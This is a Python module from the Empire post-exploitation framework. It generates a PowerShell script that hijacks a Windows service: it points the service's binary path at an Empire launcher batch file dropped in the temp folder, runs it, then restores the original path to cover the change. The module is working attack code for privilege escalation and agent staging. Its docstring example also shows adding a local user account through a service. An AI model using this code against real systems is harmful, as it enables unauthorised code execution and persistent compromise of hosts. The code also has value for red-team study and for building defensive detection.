from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ServiceStager',

            'Author': ['@harmj0y'],

            'Description': ("Modifies a target service execute an Empire stager."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   "The service name to manipulate.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }     
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        script = """
function Invoke-ServiceCMD {
    <#
    .SYNOPSIS
    Modifies a target service to execute a specified command.
    
    .DESCRIPTION
    This function stops a service, modifies it to execute a given command, starts
    the service, stops it, and then restores the original EXE path.
    
    .PARAMETER ServiceName
    The service name to manipulate. Required.

    .PARAMETER CMD
    The command to execute. Required.

    .EXAMPLE
    > Invoke-ServiceUserAdd -ServiceName VulnSVC -Command "net user john Password123! /add"
    Abuses service 'VulnSVC' to add a localuser "john" with password 
    "Password123! to the machine.
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $ServiceName,

        [Parameter(Mandatory = $True)]
        [string]
        $CMD
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'" | ?{$_}

    # make sure we got a result back
    if ($TargetService){
        try{

            # try to enable the service it was it was disabled
            $RestoreDisabled = $false
            if ($TargetService.StartMode -eq "Disabled"){
                Write-Verbose "Service '$ServiceName' disabled, enabling..."

                $result = sc.exe config $($TargetService.Name) start= demand
                if ($result -contains "Access is denied."){
                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
                    return $false
                }
                $RestoreDisabled = $true
            }

            # extract the original path and state so we can restore it later
            $OriginalPath = $TargetService.PathName
            $OriginalState = $TargetService.State
            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

            Write-Verbose "Setting service to execute command '$CMD'"
            # stop the service
            $result = sc.exe stop $($TargetService.Name)
            Start-Sleep -s 1

            # change the path name to the specified command
            $result = sc.exe config $($TargetService.Name) binPath= $CMD

            # start the service and breath
            $result = sc.exe start $($TargetService.Name)
            Start-Sleep -s 1

            Write-Verbose "Restoring original path to service '$ServiceName'"
            # stop the service
            $result = sc.exe stop $($TargetService.Name)
            Start-Sleep -s 1

            # restore the original binary path
            $result = sc.exe config $($TargetService.Name) binPath= $OriginalPath

            # try to restore the service to whatever state it was
            if ($RestoreDisabled){
                Write-Verbose "Re-disabling service '$ServiceName'"
                $result = sc.exe config $($TargetService.Name) start= disbaled
            }
            elseif ($OriginalState -eq "Paused"){
                Write-Verbose "Starting and then pausing service '$ServiceName'"
                $result = sc.exe start $($TargetService.Name)
                Start-Sleep -s .5
                $result = sc.exe pause $($TargetService.Name)
            }
            elseif ($OriginalState -eq "Stopped"){
                Write-Verbose "Leaving service '$ServiceName' in stopped state"
            }
            else{
                Write-Verbose "Starting service '$ServiceName'"
                $result = sc.exe start $($TargetService.Name)
            }

            "Command '$CMD' executed."
        }
        catch{
            Write-Warning "Error while modifying service '$ServiceName': $_"
            $false
        }
    }

    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}
"""

        # extract all of our options
        serviceName = self.options['ServiceName']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # generate the .bat launcher code to write out to the specified location
        l = self.mainMenu.stagers.stagers['launcher_bat']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        l.options['Delete']['Value'] = "True"
        launcherCode = l.generate()

        # PowerShell code to write the launcher.bat out
        script += "$tempLoc = \"$env:temp\debug.bat\""
        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script += "\"Launcher bat written to $tempLoc `n\";\n"
  
        if launcherCode == "":
            print helpers.color("[!] Error in launcher .bat generation.")
            return ""
        else:
            script += "Invoke-ServiceCMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C `\"$env:Temp\debug.bat`\"\""
            return script
